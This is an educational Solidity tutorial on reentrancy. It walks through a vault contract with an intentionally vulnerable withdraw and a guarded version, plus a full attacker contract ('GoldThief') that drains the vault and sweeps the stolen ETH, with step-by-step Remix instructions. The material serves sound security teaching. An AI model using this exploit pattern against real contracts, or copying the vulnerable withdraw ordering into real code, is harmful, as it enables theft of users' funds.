# FortKnox Contract

# 🏰 FortKnox: The Reentrancy Heist

Alright, you’ve made it this far. You’ve learned how to write smart contracts that **hold funds**, **restrict access**, and even **delegate behavior to other contracts**.

But now... you’re about to enter the real battleground of smart contract security.

Let’s talk about a classic trap that’s caught even the best of us — **reentrancy**.

---

## 🧠 The Scenario: A Digital Fort Knox

Imagine you’re building an ultra-secure **digital vault** — think of it like a crypto version of Fort Knox.

People can walk in, deposit their tokenized gold (or ETH), and walk out whenever they want to withdraw it. Nice, clean, simple.

But then…

A clever attacker shows up.

They figure out that the moment the vault sends them their gold back during withdrawal… they can **sneakily jump back in** and ask for more — _before_ the vault realizes they’ve already been paid.

Suddenly, what should’ve been a single 1 ETH withdrawal turns into **multiple ETH** getting siphoned off in one go.

This, friends, is the infamous **reentrancy attack** — the exact kind of exploit that drained **tens of millions of dollars** during the **DAO hack of 2016**.

---

## 🔍 So What _Is_ Reentrancy, Really?

Imagine a vending machine.

You put in a coin, press the button, and wait for your snack. The machine first checks if you have enough credit, **then** gives you the snack, and **finally** updates your balance.

Now imagine if there was a sneaky trick...

Right after the machine gives you the snack — **but before** it updates your balance — you press the button again. And again. And again.

Each time, the machine still thinks you have credit... because it hasn’t gotten around to updating your balance yet.

Result? **Free snacks forever.**

That’s **reentrancy** — in the smart contract world.

---

## 🕳️ What Actually Happens in Code?

Let’s translate that vending machine story to Solidity.

1. You call a **withdraw** function on a contract.
2. The contract sends you ETH using `.call{value: ...}()`.
3. But you — being sneaky — have written a **fallback function** (a function that auto-triggers when receiving ETH).
4. Inside that fallback, you **call withdraw again**.
5. The original contract hasn’t updated your balance yet… so it still thinks you have money.
6. It sends more ETH.
7. Your fallback calls withdraw **again**.
8. And so on… until the contract is drained.

---

## 🔁 Why Is It Called “Reentrancy”?

Because you are _re-entering_ the same function — before it finishes the first run.

The function is halfway through doing something important (like updating your balance), and you sneak in through the backdoor and run it again — while it’s still working.

It’s like opening a bank vault, handing someone money, and **before you shut the vault**, they barge in again asking for more — over and over.

---

## 🔨 What You’ll Build (Hands-On, Hacker Style)

To really _get_ reentrancy, we’re not just going to explain it in theory and move on.

We’re going to do something better.

We’ll **build a working contract**, **simulate an actual hack**, and then **patch the vulnerability** step by step. You'll go from developer… to hacker… to defender — all in one go.

Let’s break it down.

---

### 🔐 `GoldVault.sol` – Your Digital Fort Knox

This is your main contract — the vault.

- Users can **deposit ETH** into the vault. Think of it as storing digital gold.
- Later, they can **withdraw** that gold anytime.
- We’ll first implement a **basic withdrawal function** — no guardrails, no protection.
- Then, we’ll walk you through how an attacker can **abuse this vulnerability** to drain the contract.
- Once you’ve seen it break, we’ll show you how to **lock it down** using a simple but powerful `nonReentrant` modifier — a custom-built defense mechanism that acts like a “one-at-a-time” security lock.

By the end of it, your contract will go from “wide open” to “Fort Knox level secure.”

---

### 🦹‍♂️ `GoldThief.sol` – The Attacker Contract

This one’s fun. You’ll actually _play the villain_ for a bit.

- This contract is built to **exploit the weakness** in `GoldVault`.
- It’ll use a sneaky fallback function to **reenter the vault mid-withdrawal** — again and again.
- You’ll get a front-row seat to the hack: how it works, how it drains the funds, and how fast it happens.
- Then — we run the attack _after_ we apply the fix... and **watch it fail**.

Nothing teaches security like watching your own contract get hacked — and then stopping the hacker in their tracks.

---

By the time you’re done, you won’t just _understand_ what reentrancy is —

You’ll know **how it works**, **how to exploit it**, and most importantly, **how to prevent it**.

This is where you level up from just writing Solidity to **defending it**.

Let’s build your first digital vault — and make it unbreakable. 🔒

## 💰 `GoldVault.sol` – The Vulnerable and Secure Vault

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract GoldVault {
    mapping(address => uint256) public goldBalance;

    // Reentrancy lock setup
    uint256 private _status;
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    constructor() {
        _status = _NOT_ENTERED;
    }

    // Custom nonReentrant modifier — locks the function during execution
    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call blocked");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be more than 0");
        goldBalance[msg.sender] += msg.value;
    }

    function vulnerableWithdraw() external {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");

        goldBalance[msg.sender] = 0;
    }

    function safeWithdraw() external nonReentrant {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        goldBalance[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");
    }
}

```

This contract is the heart of our Fort Knox experiment.

It acts like a digital vault — users can **deposit ETH**, and later **withdraw their balance**.

But here’s the twist:

It has **two withdrawal functions** — one that’s **vulnerable to reentrancy attacks**, and another that’s been **hardened with a custom lock**.

### What’s Inside:

- A `deposit()` function to let users store ETH.
- A `vulnerableWithdraw()` function — this is where things go wrong. It sends ETH _before_ updating the user’s balance, leaving the door wide open for attackers.
- A `safeWithdraw()` function — this one uses a handmade `nonReentrant` modifier to block any recursive attack attempts and safely lock the vault during withdrawal.

You’ll get to see how the same contract behaves in two very different ways — and why writing secure logic **in the right order** matters so much in Solidity.

Let’s dive into the code.👇

---

# 🧱 Contract Setup

Right at the top, we declare our smart contract:

```solidity

contract GoldVault {

```

This is our vault — a simple contract where users can **deposit** ETH (treated as "gold") and **withdraw** it later. But under the hood, we’ve added an important security mechanism to **lock the door** when someone is using it — to prevent reentrancy attacks.

Let’s look at the key state variables.

---

### 🗃️ State Variables

```solidity

mapping(address => uint256) public goldBalance;

```

This keeps track of how much ETH (aka gold) each user has stored in the vault.

Whenever a user calls `deposit()`, their balance goes up.

When they call `withdraw()`, it goes down.

---

Now here’s the part that makes our contract resistant to reentrancy:

```solidity

uint256 private _status;
uint256 private constant _NOT_ENTERED = 1;
uint256 private constant _ENTERED = 2;

```

Let’s break that down:

### 🔐 The Reentrancy Lock System

- `_status` is a private variable that tells us whether a sensitive function (like `safeWithdraw`) is **currently being executed**.
- `_NOT_ENTERED` (value = `1`) means: _"The function is not being used right now — it’s safe to enter."_
- `_ENTERED` (value = `2`) means: _"Someone is already inside this function — block re-entry!"_

So basically, we’re building a **digital lock on the function**.

Before we let someone run a sensitive operation like withdrawing ETH, we check:

> "Hey, is this function already being executed?"

If yes, we **block it immediately** to stop any sneaky second entry.

If no, we **flip the switch to `_ENTERED`**, do our work, and then **set it back to `_NOT_ENTERED`** once we're done.

This lock gets activated in our `nonReentrant` modifier — we’ll look at that next.

---

### 🏗️ Constructor

```solidity

constructor() {
    _status = _NOT_ENTERED;
}

```

This sets the initial state of our reentrancy guard. When the contract is deployed, it’s in the `_NOT_ENTERED` state.

---

# 🛡️ `nonReentrant` Modifier – The Gatekeeper

```solidity

modifier nonReentrant() {
    require(_status != _ENTERED, "Reentrant call blocked");
    _status = _ENTERED;
    _;
    _status = _NOT_ENTERED;
}

```

This modifier is the **core defense** that protects our contract from reentrancy attacks.

Think of it as a **“Do Not Enter” sign** that goes up the moment someone steps into the room — and only comes down once they’ve left.

Let’s walk through how it works, step by step:

---

### 1. **Check the Lock:**

```solidity

require(_status != _ENTERED, "Reentrant call blocked");

```

This line says:

> “Is someone already inside this function? If yes — stop right there.”

If `_status` is already set to `_ENTERED`, it means another call is currently in progress. That could be a sign of a reentrancy attack, so we **block it immediately** with a revert.

---

### 2. **Flip the Lock On:**

```solidity

_status = _ENTERED;

```

This marks the function as “occupied.”

We’re basically saying:

> “Alright, we’re going in now — lock the door behind us.”

This prevents any nested calls from entering again until we’re done.

---

### 3. **Run the Function Logic:**

```solidity

_;

```

This is where the actual function body runs — whether it’s `safeWithdraw()` or anything else guarded by `nonReentrant`. Solidity will **replace the `_`** with the function code during execution.

---

### 4. **Flip the Lock Off:**

```solidity

_status = _NOT_ENTERED;

```

Once everything’s done — after all the ETH has been transferred, after all balances are updated — we **reset the lock** so future calls can proceed normally.

---

### 🧠 Why It Works

This modifier ensures that **only one call at a time** can be inside a protected function.

So even if an external contract (like an attacker’s fallback function) tries to call back into the vault — they hit the lock and get **blocked instantly**.

It’s a super simple but super powerful pattern — and it’s your first real defense against reentrancy attacks in Solidity.

---

# 🪙 deposit()

```solidity

function deposit() external payable {
    require(msg.value > 0, "Deposit must be more than 0");
    goldBalance[msg.sender] += msg.value;
}

```

Simple and safe.

- Users send ETH to this function.
- It gets added to their gold balance.
- The contract now holds their funds until they withdraw.

---

# ❌ `vulnerableWithdraw()` – Where Things Go Wrong

```solidity

function vulnerableWithdraw() external {
    uint256 amount = goldBalance[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "ETH transfer failed");

    goldBalance[msg.sender] = 0;
}

```

At first glance, this looks totally fine. You check the balance, send the ETH, and then set the user’s balance to zero.

But that one small detail — **the order of operations** — is where the trap lies.

Let’s walk through what happens, step by step.

---

### 🧪 Scenario: Attacker at the Door

Let’s say a **malicious contract** calls `vulnerableWithdraw()`. But unlike a normal user, this contract has a sneaky little `receive()` function — one that **automatically calls `vulnerableWithdraw()` again** the moment it receives ETH.

Here’s what happens:

### 1. **Check the User’s Balance**

```solidity

uint256 amount = goldBalance[msg.sender];
require(amount > 0, "Nothing to withdraw");

```

Cool — the user has 1 ETH stored in the vault. ✅

---

### 2. **Send the ETH Back**

```solidity

(bool sent, ) = msg.sender.call{value: amount}("");

```

We send the ETH back to `msg.sender`.

But here’s the twist: if `msg.sender` is a smart contract, its `receive()` function gets triggered as soon as it receives ETH. And inside that `receive()`, it **calls `vulnerableWithdraw()` again**.

So now... we’re back inside the same function **before** we’ve updated the user’s balance.

---

### 3. **Withdraw Again… And Again…**

Since we haven’t hit this line yet:

```solidity

goldBalance[msg.sender] = 0;

```

The attacker’s balance **still looks like 1 ETH**.

So when the reentrant call checks their balance, it passes again.

And the vault **sends another 1 ETH**.

Then the `receive()` function triggers **again**.

And the cycle continues.

This loop drains the vault **before it even gets a chance to zero out the attacker’s balance**.

---

### ⚠️ Why It’s Dangerous

This is a textbook **reentrancy attack**:

- External call made before state is updated ✅
- Attacker re-enters while the vault is still in the middle of processing ✅
- ETH gets drained multiple times from a single balance ✅

---

# ✅ `safeWithdraw()` – Now with `nonReentrant` Armor

```solidity

function safeWithdraw() external nonReentrant {
    uint256 amount = goldBalance[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    goldBalance[msg.sender] = 0;
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "ETH transfer failed");
}

```

This is the **secured version** of our withdrawal function — the one that shuts the door on reentrancy attackers.

Let’s break down **what changed**, and **why it works**.

---

### 🧱 First Fix: Update State _Before_ Sending ETH

```solidity

goldBalance[msg.sender] = 0;

```

This line now happens **before** we send any ETH. That means the moment the withdrawal begins, we’ve already cleared out the user’s balance.

So even if the attacker tries to **reenter the function**, they’ll see their balance is `0` — and the withdrawal will fail instantly.

This change alone **breaks the exploit loop** that was draining the contract in the vulnerable version.

---

### 🔒 Second Fix: `nonReentrant` Modifier

```solidity

function safeWithdraw() external nonReentrant { ... }

```

On top of fixing the order of operations, we’ve added an extra layer of defense with the `nonReentrant` modifier.

What this does:

- The moment someone enters the function, it **locks it down**
- If the same address (or any external contract) tries to call it again — even through a fallback — it gets **blocked immediately**
- Once the function finishes execution, the lock is lifted again

Even if we forgot to set the balance to zero early, this lock alone could have still stopped the attack.

---

### ✅ Follows the “Checks-Effects-Interactions” Pattern

This function now follows a **well-known Solidity best practice** called the **Checks-Effects-Interactions** pattern:

1. **Check** conditions

   `require(amount > 0, "Nothing to withdraw");`

2. **Effect** changes to state

   `goldBalance[msg.sender] = 0;`

3. **Interact** with external contracts

   `msg.sender.call{value: amount}("");`

Why this order matters:

By the time we interact with the outside world (which we have no control over), our own contract state is already safely updated.

This avoids a whole class of vulnerabilities — not just reentrancy.

# 🦹‍♂️ `GoldThief.sol` — The Reentrancy Exploiter (For Learning Only)

> ⚠️ Disclaimer:
>
> This contract is written purely for **educational purposes**.
>
> We do **not** encourage using or deploying this contract in any harmful or malicious way. The goal here is to help you understand **how reentrancy attacks work** — so that you can learn to **prevent** them, not exploit them.

---

To really understand how reentrancy attacks work, it’s not enough to just secure your contract — you have to **think like the attacker** too.

That’s what this contract is all about.

`GoldThief.sol` simulates a malicious actor. It’s designed to target the `vulnerableWithdraw()` function inside the `GoldVault` contract and **drain more funds than it should**, by calling the same function again and again — before the vault gets a chance to update the attacker’s balance.

We’ve also added a test call to the `safeWithdraw()` version to show how the attack **fails** when the right protection is in place.

---

### 🧪 What This Contract Does

- It connects to the vault using a simple interface.
- It deposits ETH like a normal user.
- Then, when it calls `vulnerableWithdraw()`, it enters a loop using Solidity’s `receive()` function — calling `vulnerableWithdraw()` over and over **before the original call finishes**.
- In the secure version, the same attack attempt hits a wall thanks to the `nonReentrant` lock.

This is a hands-on way to **see the attack in action**, understand how it works under the hood, and confidently build defenses against it in your own contracts.

Let’s look at the full code: 👇

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }

        if (attackingSafe) {
            targetVault.safeWithdraw(); // This will fail due to nonReentrant
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

```

---

###

# 🎯 Interface Setup — Talking to the Vault

```solidity

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

```

Before our `GoldThief` contract can interact with the vault, it needs to know **what functions are available** — and how to call them.

That’s where this **interface** comes in.

---

### 🧠 What’s an Interface in Solidity?

Think of it like a **menu** at a restaurant.

You don’t need to know how the chef makes each dish — you just need to know:

- What’s on the menu (function names)
- What ingredients it needs (parameters)
- What you get back (return types, if any)

In Solidity, an `interface` is basically a **lightweight contract definition** that includes only the **function signatures** — no implementation details.

---

### 🧩 Why Do We Need This?

Our `GoldThief` contract wants to:

- Call `deposit()` to send ETH
- Call `vulnerableWithdraw()` to trigger the attack
- Call `safeWithdraw()` to test if the vault blocks it

But we don’t import the entire `GoldVault` source code — that would be overkill.

Instead, we define this `IVault` interface to tell the compiler:

> “Hey, the target vault has these three functions. I want to interact with them.”

Once we declare this interface, we can treat the vault address as an instance of `IVault` and call those functions directly.

---

# 📦 State Variables

```solidity

IVault public targetVault;
address public owner;
uint public attackCount;
bool public attackingSafe;

```

These are the variables that store the attacker’s memory — what contract it’s targeting, who’s in control, and whether it's currently going after the **vulnerable** or **secured** version of the vault.

Let’s break each one down:

---

### 🏹 `IVault public targetVault`

This is the **address of the vault we’re targeting**, wrapped in the `IVault` interface.

It lets us call the vault’s public functions like `deposit()`, `vulnerableWithdraw()`, and `safeWithdraw()` — even though we don’t have the full source code.

It’s like pointing a remote at a TV — we don’t care how the TV is built internally, as long as the buttons (function names) do what we expect.

---

### 🧑‍💼 `address public owner`

This stores the address of **who deployed the attacker contract** — the “mastermind.”

Only the `owner` is allowed to trigger attacks or withdraw the stolen funds, just to make sure random users can’t hijack the contract once it's deployed.

It’s basic access control — so only the original attacker can push the red button.

---

### 🔁 `uint public attackCount`

This keeps track of **how many times we’ve reentered** the withdrawal loop.

Why is this important?

Because without a limit, the attack could keep looping forever (or until gas runs out). We use this counter to cap how many times the fallback function calls back into the vault — in this case, a maximum of 5 times.

---

### 🕵️‍♂️ `bool public attackingSafe`

This flag tracks **which version of the vault we’re attacking**:

- If `attackingSafe` is `false`, we’re targeting the **vulnerableWithdraw()**
- If it’s `true`, we’re testing `safeWithdraw()` — and expecting it to **fail gracefully**

This helps us decide, inside the `receive()` function, which method to call during the reentrancy loop.

---

# 🔧 Constructor — Setting the Stage

```solidity

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

```

This is the **first function that runs** when the `GoldThief` contract is deployed — and it sets up everything the attacker needs to get started.

Let’s unpack what it does:

---

### 🎯 `targetVault = IVault(_vaultAddress);`

When we deploy `GoldThief`, we pass in the address of the vault we want to attack — this could be any deployed contract that follows the `IVault` interface.

This line takes that address and tells the contract:

> “This is the vault we're going to talk to — here’s how we’ll interact with it.”

By casting the address as an `IVault`, we unlock the ability to call `deposit()`, `vulnerableWithdraw()`, and `safeWithdraw()` on the target.

---

### 🧑‍💼 `owner = msg.sender;`

This line sets **ownership** — it captures the address of the person (or script) that deployed the `GoldThief` contract.

In this case, `msg.sender` is the one who launched the attack contract.

This is important for:

- Ensuring **only the owner** can trigger attacks (`attackVulnerable()` / `attackSafe()`)
- Preventing unauthorized access to functions like `stealLoot()`

Think of it like assigning control of the red launch button — no one else should be able to press it.

---

# 💣 `attackVulnerable()` – Starting the Heist

---

```solidity

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

```

This is where the **attack officially begins**. The attacker calls this function to kick off a chain reaction that abuses the vulnerable vault logic.

Let’s break it down line by line — and explain what really happens under the hood.

---

### 🧑‍💼 Access Control

```solidity

require(msg.sender == owner, "Only owner");

```

Only the **original attacker** (the deployer of this contract) is allowed to launch the attack. That’s a basic security layer — just in case someone else tries to hijack the contract.

---

### 💰 Minimum ETH Requirement

```solidity

require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

```

The attacker must send **at least 1 ETH** with this function call — this is the initial "bait" deposit that makes the vault believe this is a normal user.

---

### 🔁 Resetting State

```solidity

attackingSafe = false;
attackCount = 0;
```

We make sure the contract knows this is a **vulnerable attack**, not a test against the safe version.

And we reset the loop counter to start fresh.

---

### 🎣 The Bait: Deposit ETH into the Vault

```solidity
targetVault.deposit{value: msg.value}();
```

We make a legitimate deposit into the vault. This updates our balance in the vault’s internal mapping — making us eligible to withdraw that ETH.

At this point, the vault is holding our 1 ETH safely… or so it thinks.

---

### 🚪 The Entry Point: Trigger the Withdrawal

```solidity
 targetVault.vulnerableWithdraw();
```

Now we call the vault’s vulnerable withdrawal function.

This function:

- **Checks our balance**
- **Sends us the ETH**
- **Only afterward** sets our balance to zero

And **that’s the mistake** — because right when the vault sends us ETH, our contract’s `receive()` function gets triggered...

# ⚡ `receive()` – Where the Reentrancy Magic Happens

```solidity
 receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail
    }
}
```

This function is the **core of the attack loop** — it’s where the vault gets tricked again and again by the same malicious actor.

But here’s the thing: the attacker **never directly calls this function**.

Instead, it gets triggered **automatically** by Solidity when the contract **receives ETH**.

---

### 🔁 Let’s Walk Through What Happens

When the vault sends ETH back during a `withdraw()`, Solidity looks for one of two things on the receiving contract:

- A `receive()` function (like this one)
- Or, if that’s missing, a `fallback()` function

Since we’ve defined `receive()`, it gets triggered **every time we receive ETH**.

---

### 🧠 The Attack Logic Inside

Let’s break down what this function does:

---

### 1. 🧮 Count the Attack Loops

```solidity
attackCount++;
```

We increment our internal counter every time this function runs. This helps us **limit the number of re-entries**, so we don’t loop infinitely and run out of gas.

---

### 2. 🔁 If We're Targeting the Vulnerable Vault...

```solidity

if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
    targetVault.vulnerableWithdraw();
}
```

If we’re in **"vulnerable attack mode"**:

- We check if the vault still has ETH to steal
- We check if we haven’t hit our attack loop limit
- If both checks pass — **we attack again**

This is the **reentrancy loop** in action:

- Vault sends us ETH → triggers `receive()`
- `receive()` re-calls `vulnerableWithdraw()`
- Vault sends us more ETH → triggers `receive()` again
- And so on...

Each time, the vault **still thinks we haven’t withdrawn** — because it hasn’t updated our balance yet.

---

### 3. 🔒 If We're Testing the Safe Vault...

```solidity

if (attackingSafe) {
    targetVault.safeWithdraw(); // This will fail
}

```

In "safe mode," we try to reenter the `safeWithdraw()` function — but it fails.

Why?

Because:

- The `nonReentrant` modifier is in place
- The moment we try to reenter, it detects the function is already running
- And it blocks us immediately

So the attack **dies right there**, and no further funds are sent

# 🚫 `attackSafe()` – A Failed Attempt at Exploiting a Secured Vault

```solidity

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();

    // This will fail due to the reentrancy guard
    targetVault.safeWithdraw();
}
```

This function is meant to simulate the same attack strategy — but this time, it targets the **secured version** of the vault: `safeWithdraw()`.

But unlike `vulnerableWithdraw()`, this one is **well-protected**.

Let’s walk through what happens:

---

### 🛡️ Setting Up the Safe Attack Attempt

- Just like in `attackVulnerable()`, we:
  - Check that the function is called by the attacker (`owner`)
  - Require at least 1 ETH to simulate a real deposit
  - Set the `attackingSafe` flag to `true` so the fallback knows we're testing the safe path
  - Reset the attack counter

---

### 💰 Deposit ETH Into the Vault

```solidity

targetVault.deposit{value: msg.value}();

```

We deposit ETH into the vault to get a balance — same as before. At this point, the vault thinks we’re a legit user.

---

### 🚪 Try to Withdraw — and Reenter

```solidity

targetVault.safeWithdraw();

```

Here’s where the difference kicks in.

When `safeWithdraw()` is called:

1. The vault checks our balance
2. It sets our balance to **0**
3. It tries to send ETH back to us
4. The `receive()` function in `GoldThief` is triggered

And then we try to **reenter** by calling `safeWithdraw()` again from inside `receive()`...

---

### 🔒 But This Time, We Hit a Wall

The moment we try to reenter `safeWithdraw()`, the `nonReentrant` modifier checks the `_status` flag and sees that the function is already in progress.

It immediately throws an error:

```

Reentrant call blocked

```

And that’s it — **the attack fails before it can even start**.

No second entry.

No loop.

No theft.

Just a clean, hard stop.

---

### 🧠 Why This Is Important

This function is a **proof of security** — it shows that with just a few extra lines of protection (like reentrancy guards and good function order), we can stop serious vulnerabilities dead in their tracks.

It’s not enough to just know how to code smart contracts — you’ve got to know how to **protect them** too.

---

### 🏃‍♂️ `stealLoot()`

```solidity

function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

```

Once the attack is done, this function lets the attacker **withdraw all stolen ETH** from the `GoldThief` contract into their personal wallet. Only the contract owner can call it.

---

### 🧾 `getBalance()`

```solidity

function getBalance() external view returns (uint256) {
    return address(this).balance;
}

```

A simple read-only function that returns the current ETH balance held by the `GoldThief` contract. Useful to see how much was drained from the vault.

---

## 🛑 Why This Matters

This contract shows you _exactly_ how a reentrancy attack works.

- The attacker takes control **mid-function**
- Before balances are updated
- And drains the same ETH multiple times

# 🧪 How to Simulate the Reentrancy Attack in Remix

Let’s put on our hacker hat (for good reasons) and walk through both the vulnerable scenario and the secured one.

---

## 🔨 Step 1: Setup Your Files

In Remix:

- Create **two new files** in the File Explorer:
  - `GoldVault.sol` – paste the full vault contract code
  - `GoldThief.sol` – paste the attacker contract and interface code

---

## ⚙️ Step 2: Compile Both Contracts

- Click the **Solidity Compiler** tab (left sidebar).
- Make sure you're using **compiler version 0.8.19** or anything compatible.
- Hit **Compile GoldVault.sol**
- Then hit **Compile GoldThief.sol**

You should see ✅ “Compilation successful”.

---

## 🚀 Step 3: Deploy the Vault (Fort Knox)

1. Go to the **Deploy & Run Transactions** tab.
2. In the Contract dropdown, select `GoldVault`.
3. Click **Deploy**.
4. Remix will deploy the contract and show it in the left panel.
5. Copy the **vault contract address** — you’ll need it for the thief.

Let’s call it:

`vaultAddress = 0x...`

---

## 🦹 Step 4: Deploy the Thief Contract

1. Switch the contract dropdown to `GoldThief`.
2. Paste the `vaultAddress` into the constructor input field.
   - Make sure it’s inside quotes like `"0x123..."`
3. Click **Deploy**.

Now the thief contract knows who to target.

---

## 💣 Step 5: Attack the Vulnerable Withdraw

1. Expand the deployed **GoldThief** contract.
2. Find the function `attackVulnerable()`.
3. Enter **1 ether** as the value (`1000000000000000000`) and click **transact**.

🎬 Watch what happens in the transaction log:

- The attacker will recursively call `vulnerableWithdraw()` multiple times.
- The vault’s balance will decrease dramatically.
- All because it didn’t update balances _before_ transferring ETH.

---

## 🧮 Step 6: Confirm the Loot

- In the thief contract, click `getBalance()`
- You’ll see multiple ether drained into the thief

Try calling `stealLoot()` to transfer it to the attacker’s wallet.

---

## 🧷 Step 7: Try the Safe Version (And Watch it Fail)

1. Deploy a **new GoldVault** contract to reset the state
2. Deploy another **GoldThief** with the new vault address
3. This time, call `attackSafe()` with 1 ETH

🧱 This transaction will **fail**.

Why? Because the `safeWithdraw()` uses:

- The **`nonReentrant` modifier** to prevent re-entry
- It updates the balance **before** sending funds

You’ve just **prevented a reentrancy attack** using best practices.

# 🔒 Vault Secured. Hacker Defeated.

What started as a simple “deposit and withdraw” system turned into a real-world Solidity security lesson.

We saw how a **tiny mistake** — sending ETH _before_ updating a balance — can open the door to devastating **reentrancy attacks**. Then we watched how a smart attacker could **loop through your vault like Pac-Man**, draining funds again and again.

But with the right defenses:

- ✅ A `nonReentrant` lock
- ✅ Updating state _before_ interacting with external calls

We completely **shut down the exploit.**

This is what writing smart contracts is really about — not just building cool features, but making sure they’re rock-solid and abuse-proof.

So whether you’re building a DApp, a DeFi protocol, or the next Web3 Fort Knox… remember:

> Secure your gold. Reentrancy is real.

On to the next contract?
